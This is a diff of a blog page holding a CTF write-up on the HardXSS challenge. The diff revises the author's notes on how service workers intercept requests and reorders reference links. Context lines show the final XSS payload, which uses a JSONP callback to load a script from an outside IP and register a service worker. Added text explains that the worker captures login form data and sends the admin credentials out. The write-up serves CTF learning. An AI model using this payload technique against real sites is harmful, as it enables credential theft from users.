@@ -28,7 +28,7 @@
 <meta property="og:site_name" content="Z3ratu1&#39;s blog">
 <meta property="og:description" content="[西湖论剑2020]HardXSS西湖论剑加bytectf连遇到两个前端题，终于该好好学习一下前端安全了 jsonpjsonp是为了跨域获取数据而产生的一种临时方案，现在通常使用更牛逼的CORS，jsonp的简单实现就是在HTML页面上定义一些函数，不妨就叫它callBackFunc，然后用script的src=xxx.com&#x2F;callback=callBackFunc 导入，服务端那边就整一个类">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-11-03T08:59:46.698Z">
+<meta property="og:updated_time" content="2020-11-03T15:16:02.509Z">
 <meta name="twitter:card" content="summary">
 
 <link rel="canonical" href="http://z3ratu1.github.io/2020/10/26/%5B2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%5DHardXSS/">
@@ -230,7 +230,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-11-03 16:59:46" itemprop="dateModified" datetime="2020-11-03T16:59:46+08:00">2020-11-03</time>
+                <time title="修改时间：2020-11-03 23:16:02" itemprop="dateModified" datetime="2020-11-03T23:16:02+08:00">2020-11-03</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -365,12 +365,13 @@ self<span class="token punctuation">.</span><span class="token function">addEven
 <span class="token punctuation">}</span></code></pre>
 <p>最终payload就为<br><a href="https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%27http://47.103.140.44/1.js%27);//" target="_blank" rel="noopener">https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%27http://47.103.140.44/1.js%27);//</a><br>这个题用importScripts做回调函数会报错没定义，所以就用jsonp来导入1.js再导入sw.js<br>但是我没有https，不给导入，就不知道能不能成了。。。</p>
 <p>sw把这个请求的回复变成了一个script，自动的把url里面的参数发到了我们对应的服务器上<br>用location.search获取？后面的参数，发送出来，获取到admin的账号密码</p>
-<h3 id="11-3修订"><a href="#11-3修订" class="headerlink" title="11.3修订"></a>11.3修订</h3><p>再看了一下service worker，其确切的作用应该是截取用户的请求并返回对应的缓存，当你在这个页面下请求一个跨域请求时同样会经手service worker。<br>暂且理解为service worker接管与注册域相关的请求和注册域下发出的请求并拦截下来进行处理了，官方文档好像也是这么说的。也就是说从其他站访问sw注册的站和sw注册的站请求的资源都可能经手sw</p>
+<h3 id="11-3修订"><a href="#11-3修订" class="headerlink" title="11.3修订"></a>11.3修订</h3><p>再看了一下service worker，加上rmb神仙的亲手指导，我完全懂了（大概）。sw确切的作用应该是截取用户的请求并返回对应的数据，正常使用就是加载外部资源图片之类的时候可以缓存一手，下次请求就不用再去下载了。也就是说只能拦截在当前域下发出的请求，在这个页面下的请求为一个跨域请求时同样会经手service worker。从其他域去加载sw注册域下的资源是不会经手service worker的。<br>这个题这里是xss向auth下发起一个请求，按照我们上面的理论应该是不能获取到数据的，但表单会改window.location，域就变成 auth.xss 了，这个请求就是从auth下发出的了，就能截获了<br>这里看xss下的登录表单，用的是GET方法，所以用location.search获取GET的数据，如果用的是POST，就用event.request.body获取</p>
+<p>官方文档有如下解释</p>
 <blockquote>
 <p>A fetch event fires every time any resource controlled by a service worker is fetched, which includes the documents inside the specified scope, and any resources referenced in those documents (for example if index.html makes a cross origin request to embed an image, that still goes through its service worker.)</p>
 </blockquote>
-<p>补一个链接<br><a href="https://blogs.akamai.com/sitr/2020/01/abusing-the-service-workers-api.html" target="_blank" rel="noopener">https://blogs.akamai.com/sitr/2020/01/abusing-the-service-workers-api.html</a></p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://lightless.me/archives/XSS-With-Service-Worker.html" target="_blank" rel="noopener">https://lightless.me/archives/XSS-With-Service-Worker.html</a><br><a href="https://zhuanlan.zhihu.com/p/29734820" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/29734820</a><br>官方文档<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers</a></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://lightless.me/archives/XSS-With-Service-Worker.html" target="_blank" rel="noopener">https://lightless.me/archives/XSS-With-Service-Worker.html</a><br><a href="https://zhuanlan.zhihu.com/p/29734820" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/29734820</a><br><a href="https://blogs.akamai.com/sitr/2020/01/abusing-the-service-workers-api.html" target="_blank" rel="noopener">https://blogs.akamai.com/sitr/2020/01/abusing-the-service-workers-api.html</a></p>
+<p>官方文档<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers</a></p>
 
     </div>
 
